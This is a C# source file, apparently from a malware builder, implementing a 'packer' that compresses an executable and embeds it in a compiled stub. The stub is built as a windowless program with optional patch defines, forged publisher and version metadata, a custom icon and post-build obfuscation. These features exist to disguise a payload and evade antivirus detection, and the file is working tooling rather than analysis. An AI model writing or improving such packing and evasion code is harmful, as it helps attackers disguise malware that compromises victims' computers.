﻿using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System;
using System.IO;
using System.IO.Compression;
using System.Text.RegularExpressions;

namespace Builder.ModulesBuilder.Builder
{
    internal class PackerEngine
    {
        public static void PerformPacking(string targetFile, string outFilePath, bool UseObfus, bool UsePatchers, string IconFile, string AssemblyFile)
        {
            if (File.Exists(targetFile))
            {
                byte[] fileBytes = File.ReadAllBytes(targetFile);
                byte[] bytePayload = Compress(fileBytes);
                File.Delete(targetFile);

                CompileStub(bytePayload, outFilePath, UseObfus, UsePatchers, IconFile, AssemblyFile);
            }
        }

        public static void CompileStub(byte[] encPayload, string outPath, bool UseObfus, bool UsePatchers, string IconPath, string AssemblyTxt)
        {
            string stubSourceCode = Properties.Resources.PackerStub;

            string hexArray = EncryptEngine.GenerateHexArray(encPayload);

            stubSourceCode = Regex.Replace(
                stubSourceCode,
                @"public static byte\[\] HexPayload = new byte\[\] \{.*?\};",
                "public static byte[] HexPayload = " + hexArray,
                RegexOptions.Singleline
            );


            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outPath,
                CompilerOptions = "/platform:x64 /target:winexe",
                IncludeDebugInformation = false
            };

            if (UsePatchers)
            {
                parameters.CompilerOptions += $" /define:PATCH";
            }

            if (!string.IsNullOrEmpty(AssemblyTxt) && File.Exists(AssemblyTxt))
            {
                parameters.CompilerOptions += " /define:UseAssembly";
                var metadata = File.ReadAllLines(AssemblyTxt);

                string title = metadata.Length > 0 ? metadata[0] : "N/A";
                string description = metadata.Length > 1 ? metadata[1] : "N/A";
                string company = metadata.Length > 2 ? metadata[2] : "N/A";
                string product = metadata.Length > 3 ? metadata[3] : "N/A";
                string copyright = metadata.Length > 4 ? metadata[4] : "N/A";
                string trademarks = metadata.Length > 5 ? metadata[5] : "N/A";
                string fileVersion = metadata.Length > 6 ? metadata[6] : "N/A";
                string productVersion = metadata.Length > 7 ? metadata[7] : "N/A";

                stubSourceCode = stubSourceCode.Replace("%TITLE%", title);
                stubSourceCode = stubSourceCode.Replace("%DESC%", description);
                stubSourceCode = stubSourceCode.Replace("%COMPANY%", company);
                stubSourceCode = stubSourceCode.Replace("%PRODUCT%", product);
                stubSourceCode = stubSourceCode.Replace("%COPYRIGHT%", copyright);
                stubSourceCode = stubSourceCode.Replace("%TRADEMARK%", trademarks);
                stubSourceCode = stubSourceCode.Replace("%VERSION%", productVersion);
                stubSourceCode = stubSourceCode.Replace("%FILE_VERSION%", fileVersion);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");

            if (!string.IsNullOrEmpty(IconPath) && File.Exists(IconPath))
            {
                parameters.CompilerOptions += $" /win32icon:\"{IconPath}\"";
            }


            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, stubSourceCode);

                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine($"Error compilation: {error.ErrorText}");
                        Console.WriteLine($"File: {error.FileName}");
                        Console.WriteLine($"String: {error.Line}, Column: {error.Column}");
                        Console.WriteLine($"ID Error: {error.ErrorNumber}");
                        Console.WriteLine($"This {(error.IsWarning ? "Warning" : "Error")}");
                        Console.WriteLine(new string('-', 50));
                    }
                    throw new InvalidOperationException("Failed to compilate.");
                }
            }

            if (UseObfus)
            {
                ObfuscateEngine.PerformObfuscation(outPath);
            }
        }
   
        public static byte[] Compress(byte[] data)
        {
            using (var compressedStream = new MemoryStream())
            using (var compressionStream = new DeflateStream(compressedStream, CompressionMode.Compress))
            {
                compressionStream.Write(data, 0, data.Length);
                
                compressionStream.Close();

                return compressedStream.ToArray();
            }
        }
    }
}
